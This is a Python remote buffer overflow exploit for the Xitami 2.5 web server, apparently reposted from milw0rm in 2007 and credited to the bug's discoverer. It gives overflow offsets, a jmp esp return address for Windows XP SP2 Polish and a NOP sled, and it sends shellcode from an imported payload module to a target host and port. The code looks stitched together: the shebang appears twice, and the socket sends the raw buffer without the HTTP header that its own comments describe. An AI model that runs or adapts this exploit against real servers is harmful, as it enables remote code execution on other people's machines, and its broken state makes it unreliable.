#!/usr/bin/python
# Xitami Web Server 2.5 (If-Modified-Since) 0day Remote Buffer Overflow Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on: Xitami 2.5c2 / XP SP2 Polish
# Shellcode: Windows Execute Command (calc) <metasploit.com>
# Details:..
#
#     [Module xigui32.exe]
#     If-Modified-Since: Evil, ["A" * 76]\r\n
#     EIP 41414141
#
#     [Module xitami.exe]
#     If-Modified-Since: Evil, ["A" * 104]\r\n
#     EIP 41414141
#
# Product Homepage: http://www.xitami.com/
# Just for fun  ;) 
##

from struct import pack
from time import sleep

#!/usr/bin/python

import socket
from payload import buf
def shell_attack(target_machine, target_port):
    host = target_machine
    port = target_port
    opcode = pack(b"<L", 0x7CA76981) # jmp esp (shell32.dll / XP SP2 Polish)
    jmpcode = b"\xeb\x22"            # jmp short +0x22

    buffer = b"A" * 72                  # (76 - 4) xigui32.exe
    buffer += opcode
    buffer += jmpcode
    buffer += b"\x90" * 128
    buffer += buf

   
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((host, port))
        s.send(buffer)
        sleep(1)
        s.close()
    except:
        print("No Connection Established")    
# EoF

# milw0rm.com [2007-09-24]